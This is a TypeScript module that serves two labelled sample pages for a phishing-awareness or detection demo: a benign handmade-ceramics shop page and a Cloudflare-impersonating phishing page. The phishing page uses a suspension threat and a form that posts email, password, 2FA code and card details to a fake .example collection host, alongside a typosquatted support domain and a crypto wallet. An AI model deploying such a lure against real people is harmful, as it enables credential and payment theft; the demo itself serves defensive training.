/**
 * Self-hosted sample pages so the demo never depends on live malicious sites.
 * They are served by this Worker under /demo/* and are clearly labelled as training samples.
 * Every domain, address and wallet below is fake (`.example` is reserved by RFC 2606).
 */

const SAMPLE_BANNER = `<div style="position:fixed;bottom:0;left:0;right:0;background:#111;color:#999;font:11px sans-serif;padding:4px 8px;text-align:center">PPUG training sample: not a real site</div>`;

const PHISHING = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Cloudflare | Account Security Verification</title>
<style>
body{margin:0;font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f2f2f2;color:#222}
header{background:#fff;border-bottom:1px solid #ddd;padding:14px 32px;display:flex;align-items:center;gap:10px}
.logo{width:42px;height:24px;background:#f6821f;border-radius:14px 14px 4px 4px}
main{max-width:420px;margin:48px auto;background:#fff;border-radius:8px;padding:32px;box-shadow:0 2px 12px #0001}
.alert{background:#fff4e5;border:1px solid #f6821f;color:#8a4b00;padding:12px;border-radius:6px;font-size:14px;margin-bottom:20px}
label{display:block;font-size:13px;margin:14px 0 4px}input{width:100%;padding:10px;border:1px solid #bbb;border-radius:4px;box-sizing:border-box}
button{margin-top:20px;width:100%;padding:12px;background:#f6821f;border:0;color:#fff;font-weight:600;border-radius:4px}
footer{text-align:center;font-size:12px;color:#777;margin:24px}
</style></head>
<body>
<header><div class="logo"></div><strong>Cloudflare</strong></header>
<main>
  <div class="alert"><strong>Your account has been suspended.</strong> We detected unusual sign-in activity. Verify your identity within <strong>24 hours</strong> or all zones and Workers will be permanently deleted.</div>
  <h2>Verify your account</h2>
  <form action="https://cf-account-verify.example/collect" method="post">
    <label>Email</label><input name="email" type="email" placeholder="you@company.com">
    <label>Password</label><input name="password" type="password">
    <label>2FA code</label><input name="otp" inputmode="numeric">
    <label>Card for $49.99 reactivation fee</label><input name="card" placeholder="1234 5678 9012 3456">
    <button type="submit">Verify and restore access</button>
  </form>
</main>
<footer>
  Need help? security@cloudfIare-support.example · +1 (415) 555-0199<br>
  Prefer crypto? Send the fee to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh<br>
  <a href="https://cloudfIare-support.example/terms">Terms</a> · <a href="https://cdn.cf-account-verify.example/kit.js">Status</a>
</footer>
${SAMPLE_BANNER}
</body></html>`;

const SHOP = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Maple & Moss | Handmade Ceramics</title>
<style>
body{margin:0;font-family:Georgia,serif;background:#faf7f2;color:#2d2a26}
header{padding:20px 40px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e6dfd3}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;padding:40px}
.card{background:#fff;border-radius:10px;padding:16px;box-shadow:0 1px 6px #0000000d}
.img{height:150px;border-radius:8px;background:linear-gradient(135deg,#c9b79c,#8a9a7b)}
.price{color:#6b7f5a;font-weight:bold}
</style></head>
<body>
<header><h1>Maple &amp; Moss</h1><nav>Shop · About · Cart (0)</nav></header>
<p style="padding:0 40px">Small-batch stoneware, thrown by hand in Montreal. Free shipping in Canada over $75.</p>
<section class="grid">
  <div class="card"><div class="img"></div><h3>Speckled Mug</h3><p class="price">$34.00</p></div>
  <div class="card"><div class="img"></div><h3>Serving Bowl</h3><p class="price">$68.00</p></div>
  <div class="card"><div class="img"></div><h3>Bud Vase</h3><p class="price">$22.00</p></div>
</section>
<p style="padding:0 40px 60px">Questions? hello@maplemoss.example</p>
${SAMPLE_BANNER}
</body></html>`;

export const DEMO_PAGES: Record<string, string> = {
  "/demo/cloudflare-verify": PHISHING,
  "/demo/shop": SHOP,
};
